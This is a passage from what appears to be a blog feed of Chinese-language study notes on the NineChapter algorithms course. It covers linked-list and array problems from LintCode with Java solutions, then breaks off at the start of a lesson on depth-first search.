<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p><a href="http://www.lintcode.com/en/problem/frog-jump/" target="_blank" rel="noopener">Frog Jump</a></p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LintCode </tag>
            
            <tag> NineChapter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[九章-链表与数组]]></title>
      <url>/2018/03/16/Algorithms/%E4%B9%9D%E7%AB%A0-%E9%93%BE%E8%A1%A8%E4%B8%8E%E6%95%B0%E7%BB%84/</url>
      <content type="html"><![CDATA[<p>九章第五讲，链表与数组。</p>
<p>数组在内存中连续存储，存取更快，插入删除慢。且数组的size是固定的，灵活性不如链表</p>
<p>链表在内存中碎片存储，插入删除操作更快，存取操作慢</p>
<a id="more"></a>
<h1 id="链表"><a href="#链表" class="headerlink" title="链表"></a>链表</h1><p>链表的题目不难，但是比较考验基本功，写的时候走好在纸上画一下图，比较容易理清楚节点之间的关系。</p>
<h2 id="基础知识测试"><a href="#基础知识测试" class="headerlink" title="基础知识测试"></a>基础知识测试</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print</span><span class="params">(ListNode node)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(node != <span class="keyword">null</span>)&#123;</span><br><span class="line">        System.out.print(node.val);</span><br><span class="line">        System.out.print(<span class="string">"-&gt;"</span>);</span><br><span class="line">        node = node.next;</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">"null"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    ListNode node1 = <span class="keyword">new</span> ListNode(<span class="number">1</span>);</span><br><span class="line">    ListNode node2 = <span class="keyword">new</span> ListNode(<span class="number">2</span>);</span><br><span class="line">    ListNode node3 = <span class="keyword">new</span> ListNode(<span class="number">3</span>);</span><br><span class="line"></span><br><span class="line">    node1.next = node2;</span><br><span class="line">    node2.next = node3;</span><br><span class="line"></span><br><span class="line">    ListNode head = node1;</span><br><span class="line">    print(head);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//print again</span></span><br><span class="line">    node1 = node2;</span><br><span class="line">    print(head);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>问两次print会分别得到什么样的结果？</p>
<p>答案是两次print会得到一样的结果。原因是这里node1，node2，node3（在栈stack空间）都是reference，记录了我们new出来的的node结点（在堆heap空间）的地址，head也是存储了第一个node结点的位置。所以<code>node1 = node2</code> 这样的操作只是把把node1中存储的地址改为了heap中第二个结点的地址，并不能改变链表的结构。</p>
<h2 id="Example1-Reverse-Nodes-in-k-Group"><a href="#Example1-Reverse-Nodes-in-k-Group" class="headerlink" title="Example1: Reverse Nodes in k-Group"></a>Example1: Reverse Nodes in k-Group</h2><p><a href="http://www.lintcode.com/en/problem/reverse-nodes-in-k-group/" target="_blank" rel="noopener">Reverse Nodes in K-Group</a>这道题要求我们k个一组翻转链表中的结点，如果最后一组不满足k个则不翻转。<br>例如很容易想到我们需要一个子函数来翻转k个结点，需要的参数应该有这k个结点的头head和长度k。但是实际上我们要翻转这k个结点的时候并不只需要这k个node，例如我们有1-&gt;2-&gt;3-&gt;4-&gt;5这样的链表，当我们翻转1-&gt;2之后，得到2-&gt;1-&gt;3-&gt;4-&gt;5。接下来需要翻转3和4时，可以发现我们还需要3、4前面的结点1。所以我们的翻转k个结点的子函数就需要头结点之前那个结点作为参数。即实现这样的功能<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// prev -&gt; n1 -&gt; n2 ... -&gt; nk -&gt; nk+1</span></span><br><span class="line"><span class="comment">// ==&gt;</span></span><br><span class="line"><span class="comment">// prev -&gt; nk -&gt; nk-1...-&gt; n1 -&gt; nk+1</span></span><br><span class="line"><span class="comment">// return n1</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseAndReturnLastPrev</span><span class="params">(ListNode lastPrev, <span class="keyword">int</span> k)</span></span>&#123;</span><br><span class="line">        ListNode n1 = lastPrev.next;</span><br><span class="line">        ListNode nk = n1;</span><br><span class="line">        <span class="comment">// 不足K个</span></span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span>(nk == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">            nk = nk.next;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// 够K个</span></span><br><span class="line">        ListNode prev = lastPrev;</span><br><span class="line">        ListNode cur = n1;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; k; i++)&#123;</span><br><span class="line">            <span class="comment">// System.out.println(cur.val);</span></span><br><span class="line">            ListNode tmp = cur.next;</span><br><span class="line">            cur.next = prev;</span><br><span class="line">            prev = cur;</span><br><span class="line">            cur = tmp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 出循环之后需要处理nk+1和lastPrev</span></span><br><span class="line">        n1 = lastPrev.next;</span><br><span class="line">        ListNode nkplus = cur;</span><br><span class="line">        nk = prev;</span><br><span class="line">        lastPrev.next = nk;</span><br><span class="line">        n1.next = nkplus;</span><br><span class="line">        <span class="keyword">return</span> n1;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p>
<p>然后第一次调用这个子函数的时候，因为head之前已经没有节点了，则我们需要一个dummy node来指向head结点。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">reverseKGroup</span><span class="params">(ListNode head, <span class="keyword">int</span> k)</span> </span>&#123;</span><br><span class="line">    ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    dummy.next = head;</span><br><span class="line">    ListNode lastPrev = dummy;</span><br><span class="line">    <span class="keyword">while</span>(lastPrev != <span class="keyword">null</span>)&#123;</span><br><span class="line">        lastPrev = reverseAndReturnLastPrev(lastPrev, k);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> dummy.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Example2-Sort-List"><a href="#Example2-Sort-List" class="headerlink" title="Example2: Sort List"></a>Example2: Sort List</h2><p><a href="http://www.lintcode.com/en/problem/sort-list/" target="_blank" rel="noopener">Sort List</a>链表排序问题。数组的merge sort需要O(n)的额外空间，而链表的merge sort不需要。merge sort的过程就是先找链表中点，然后对两半各自进行merge sort，再将两个链表合并起来。 合并两个链表是非常需要掌握的基本功。这里找中点用了一个比较巧妙的解法。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">sortList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    ListNode middle = findMiddle(head);</span><br><span class="line">    <span class="comment">// System.out.println(middle.val);</span></span><br><span class="line">    ListNode secondHalf = middle.next;</span><br><span class="line">    middle.next = <span class="keyword">null</span>;</span><br><span class="line">    ListNode left = sortList(head);</span><br><span class="line">    ListNode right = sortList(secondHalf);</span><br><span class="line">    ListNode newHead = merge(left, right);</span><br><span class="line">    <span class="keyword">return</span> newHead;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">findMiddle</span><span class="params">(ListNode head)</span></span>&#123;</span><br><span class="line">    ListNode slow = head, fast = head.next;</span><br><span class="line">    <span class="keyword">while</span> (fast != <span class="keyword">null</span> &amp;&amp; fast.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        fast = fast.next.next;</span><br><span class="line">        slow = slow.next;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> slow;</span><br><span class="line">    <span class="comment">// int count = 1;</span></span><br><span class="line">    <span class="comment">// ListNode p = head, q = head;</span></span><br><span class="line">    <span class="comment">// while(p != null)&#123;</span></span><br><span class="line">    <span class="comment">//     p = p.next;</span></span><br><span class="line">    <span class="comment">//     count++;</span></span><br><span class="line">    <span class="comment">// &#125;</span></span><br><span class="line">    <span class="comment">// for(int i = 0; i &lt; count / 2 - 1; i++)</span></span><br><span class="line">    <span class="comment">//     q = q.next;</span></span><br><span class="line">    <span class="comment">// return q;</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">merge</span><span class="params">(ListNode first, ListNode second)</span></span>&#123;</span><br><span class="line">    ListNode dummy = <span class="keyword">new</span> ListNode(<span class="number">0</span>);</span><br><span class="line">    ListNode head = dummy;</span><br><span class="line">    <span class="keyword">while</span>(first!= <span class="keyword">null</span> &amp;&amp; second != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(first.val &lt; second.val)&#123;</span><br><span class="line">            dummy.next = first;</span><br><span class="line">            first = first.next;</span><br><span class="line">            dummy = dummy.next;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            dummy.next = second;</span><br><span class="line">            second = second.next;</span><br><span class="line">            dummy = dummy.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(first!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        dummy.next = first;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(second != <span class="keyword">null</span>) &#123;</span><br><span class="line">        dummy.next = second;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head.next;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="Example3-Copy-List-with-Random-Pointer"><a href="#Example3-Copy-List-with-Random-Pointer" class="headerlink" title="Example3: Copy List with Random Pointer"></a>Example3: Copy List with Random Pointer</h2><p><a href="http://www.lintcode.com/en/problem/copy-list-with-random-pointer/" target="_blank" rel="noopener">Copy List with Random Pointer</a> 这一题乍一看感觉和copy graph那道题是一样的，先复制结点，构造一个新老结点之间映射的hashmap，再复制边。但是这题有个要求是in place, 即不要用额外空间，所以就要使用一个特殊的方法来代替hashmap，来存储新老结点之间的映射。使1-&gt;2-&gt;3这样的链表变成1-&gt;new1-&gt;2-&gt;new2-&gt;3-&gt;new3，这样每个节点对应的新节点就是node-&gt;next<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> RandomListNode <span class="title">copyRandomList</span><span class="params">(RandomListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(head == <span class="keyword">null</span>) <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    copyNode(head);</span><br><span class="line">    copyRandom(head);</span><br><span class="line">    <span class="keyword">return</span> splitList(head);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">copyNode</span><span class="params">(RandomListNode head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(head != <span class="keyword">null</span>)&#123;</span><br><span class="line">        RandomListNode node = <span class="keyword">new</span> RandomListNode(head.label);</span><br><span class="line">        node.next = head.next;</span><br><span class="line">        head.next = node;</span><br><span class="line">        <span class="comment">//move to next node</span></span><br><span class="line">        head = head.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;   </span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">copyRandom</span><span class="params">(RandomListNode head)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(head != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(head.random != <span class="keyword">null</span>)&#123;</span><br><span class="line">            RandomListNode node = head.next;</span><br><span class="line">            node.random = head.random.next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// move to next node</span></span><br><span class="line">        head = head.next.next;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> RandomListNode <span class="title">splitList</span><span class="params">(RandomListNode head)</span></span>&#123;</span><br><span class="line">    RandomListNode newHead = head.next;</span><br><span class="line">    <span class="keyword">while</span>(head!=<span class="keyword">null</span>)&#123;</span><br><span class="line">        RandomListNode temp = head.next;</span><br><span class="line">        head.next = temp.next;</span><br><span class="line">        head = head.next;</span><br><span class="line">        <span class="keyword">if</span>(temp.next != <span class="keyword">null</span>)&#123;</span><br><span class="line">            temp.next = temp.next.next;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> newHead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="More"><a href="#More" class="headerlink" title="More"></a>More</h2><p><a href="http://www.lintcode.com/en/problem/linked-list-cycle/" target="_blank" rel="noopener">LinkedList Cycle</a><br><a href="http://www.lintcode.com/en/problem/partition-list/" target="_blank" rel="noopener">Partion List</a></p>
<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><h2 id="Example1-Merge-Sorted-Array"><a href="#Example1-Merge-Sorted-Array" class="headerlink" title="Example1: Merge Sorted Array"></a>Example1: Merge Sorted Array</h2><p><a href="http://www.lintcode.com/en/problem/merge-sorted-array/" target="_blank" rel="noopener">Merge Sorted Array</a> 给两个排好序的数组，将其中一个merge进另一个中。这道题比较笨的办法是遍历B中所有的元素，将其插入到A中对应地方。但是如果我们A=[3,4,5,empty,empty],B=[1,2]那么每次插入时候A中的元素都会整体后移，造成时间复杂度最坏为<code>O(n * m)</code> 。而比较巧妙地方法是倒着来，从大的一段来merge，<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">mergeSortedArray</span><span class="params">(<span class="keyword">int</span>[] A, <span class="keyword">int</span> m, <span class="keyword">int</span>[] B, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i = m-<span class="number">1</span>, j = n-<span class="number">1</span>, index = m + n - <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> (i &gt;= <span class="number">0</span> &amp;&amp; j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (A[i] &gt; B[j]) &#123;</span><br><span class="line">            A[index--] = A[i--];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            A[index--] = B[j--];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (i &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        A[index--] = A[i--];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">while</span> (j &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        A[index--] = B[j--];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="Subarray问题"><a href="#Subarray问题" class="headerlink" title="Subarray问题"></a>Subarray问题</h2><p>子数组问题中经常用到的一个技巧是前缀和prefixSum. <code>prefixSum[i] = a[0] + a[1] + ... + a[i-1]</code> 利用前缀和可以很方便的计算下标i到下标j之间的所有元素之和<code>Sum(i~j) = prefixSum[j + 1] - prefixSum[i]</code></p>
<h3 id="Example1-Maximum-Subarray"><a href="#Example1-Maximum-Subarray" class="headerlink" title="Example1: Maximum Subarray"></a>Example1: Maximum Subarray</h3><p><a href="http://www.lintcode.com/en/problem/maximum-subarray/" target="_blank" rel="noopener">Maximum Subarray</a>求最大子数组。 </p>
<p>首先我们把问题拆分成一个小问题，加入我们有[1,2,3,4,5]这样一个数组，想要计算以index=3结尾的最大子数组。 实际上要求的就是<code>Prefix[4] - Prefix[x]</code> 其中（x &lt; 4）的最大值，那么我们只需要找出Prefix[x]的最小值即可。 </p>
<p>然后如果我们想求出整个数组的最大子数组，没有以谁结尾的限制，那么只用遍历整个数组，尝试以每一个元素结尾即可。我们用sum来表示<code>prefix[i+1]</code>, 用min来记录<code>prefix[x](x &lt; i)</code>的最小值，max来记录当前找到的最大子数组。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxSubArray</span><span class="params">(<span class="keyword">int</span>[] A)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (A == <span class="keyword">null</span> || A.length == <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">int</span> max = Integer.MIN_VALUE, sum = <span class="number">0</span>, minSum = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; A.length; i++) &#123;</span><br><span class="line">            sum += A[i];</span><br><span class="line">            max = Math.max(max, sum - minSum);</span><br><span class="line">            minSum = Math.min(minSum, sum);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Follow Up:如果要求minimum subarray怎么求？  一个偷懒的方法是把所有的数都取相反数，求出最大子数组，将结果再取一个相反数即可。</p>
<h3 id="Example2-Subarray-Sum"><a href="#Example2-Subarray-Sum" class="headerlink" title="Example2: Subarray Sum"></a>Example2: Subarray Sum</h3><p><a href="http://www.lintcode.com/en/problem/subarray-sum/" target="_blank" rel="noopener">Subarray Sum</a> 求一段和为0的子数组。 在我们计算出prefix数组之后，只需要找到两个相等元素（例如prefix[i] == prefix[j]），即可得到从下标i到下标j之间的数组之和为0</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;Integer&gt; <span class="title">subarraySum</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(nums == <span class="keyword">null</span> || nums.length == <span class="number">0</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    List&lt;Integer&gt; result = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">    HashMap&lt;Integer, Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    map.put(<span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; nums.length; i++)&#123;</span><br><span class="line">        sum = sum + nums[i];</span><br><span class="line">        <span class="keyword">if</span>(map.containsKey(sum))&#123;</span><br><span class="line">            result.add(map.get(sum));</span><br><span class="line">            result.add(i);</span><br><span class="line">            <span class="keyword">return</span> result;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            map.put(sum, i + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Follow Up: <a href="http://www.lintcode.com/en/problem/subarray-sum-closest/" target="_blank" rel="noopener">Subarray Sum Closest</a> 找到最接近于0的subarray。我们很容易会想到去找两个尽可能接近的prefix，那么可以计算出prefix之后进行排序。因为我们在排序的同时还要记录prefix对应的下标index，所以这里引入了node类。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">int</span>[] subarraySumClosest(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">    Node[] s = <span class="keyword">new</span> Node[nums.length + <span class="number">1</span>];</span><br><span class="line">    s[<span class="number">0</span>] = <span class="keyword">new</span> Node(<span class="number">0</span>, -<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span>[] results = <span class="keyword">new</span> <span class="keyword">int</span>[<span class="number">2</span>];</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>, len = nums.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; ++i) &#123;</span><br><span class="line">        sum += nums[i];</span><br><span class="line">        s[i + <span class="number">1</span>] = <span class="keyword">new</span> Node(sum, i);</span><br><span class="line">    &#125;</span><br><span class="line">    Arrays.sort(s, <span class="keyword">new</span> NodeComparator());</span><br><span class="line">    len = s.length;</span><br><span class="line">    <span class="keyword">int</span> ans = <span class="number">0x7fffffff</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len-<span class="number">1</span>; ++i)</span><br><span class="line">        <span class="keyword">if</span> (Math.abs(s[i+<span class="number">1</span>].value - s[i].value) &lt; ans) &#123;</span><br><span class="line">            ans = Math.abs(s[i+<span class="number">1</span>].value - s[i].value);</span><br><span class="line">            results[<span class="number">0</span>] = Math.min(s[i+<span class="number">1</span>].pos, s[i].pos) + <span class="number">1</span>;</span><br><span class="line">            results[<span class="number">1</span>] = Math.max(s[i+<span class="number">1</span>].pos, s[i].pos);</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">    <span class="keyword">return</span> results;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">NodeComparator</span> <span class="keyword">implements</span> <span class="title">Comparator</span>&lt;<span class="title">Node</span>&gt;</span>&#123;  </span><br><span class="line">    <span class="meta">@Override</span>  </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">compare</span><span class="params">(Node o1, Node o2)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> o1.value - o2.value;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; </span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Node</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> value;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span> pos;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Node</span><span class="params">(<span class="keyword">int</span> _value, <span class="keyword">int</span> _pos)</span> </span>&#123;</span><br><span class="line">        value = _value;</span><br><span class="line">        pos = _pos;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="More-1"><a href="#More-1" class="headerlink" title="More"></a>More</h2><p><a href="http://www.lintcode.com/en/problem/intersection-of-two-arrays/" target="_blank" rel="noopener">Intersection of two array</a></p>
<p><a href="http://www.lintcode.com/problem/median-of-two-sorted-arrays/" target="_blank" rel="noopener">Median of Two Sorted Array</a></p>
]]></content>
      
        <categories>
            
            <category> 厚积薄发 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> LintCode </tag>
            
            <tag> NineChapter </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[九章-DFS]]></title>
      <url>/2018/03/15/Algorithms/%E4%B9%9D%E7%AB%A0-DFS/</url>
      <content type="html"><![CDATA[<p>九章第四讲，深度优先搜索。</p>
<h1 id="深度优先搜索-DFS"><a href="#深度优先搜索-DFS" class="headerlink" title="深度优先搜索 DFS"></a>深度优先搜索 DFS</h1><h2 id="什么是深度优先搜索？"><a href="#什么是深度优先搜索？" class="headerlink" title="什么是深度优先搜索？"></a>什么是深度优先搜索？</h2><p><strong>Depth-first search</strong> (<strong>DFS</strong>) is an algorithm for traversing or searching tree or graph data structures. One starts at the root (selecting some arbitrary node as the root in the case of a graph) and explores as far as possible along each branch before <strong>backtracking</strong>.</p>
<a id="more"></a>
<h2 id="什么时候使用DFS"><a href="#什么时候使用DFS" class="headerlink" title="什么时候使用DFS?"></a>什么时候使用DFS?</h2><p>回顾：什么时候使用bfs? </p>
<ol>
<li>最短最近路径</li>
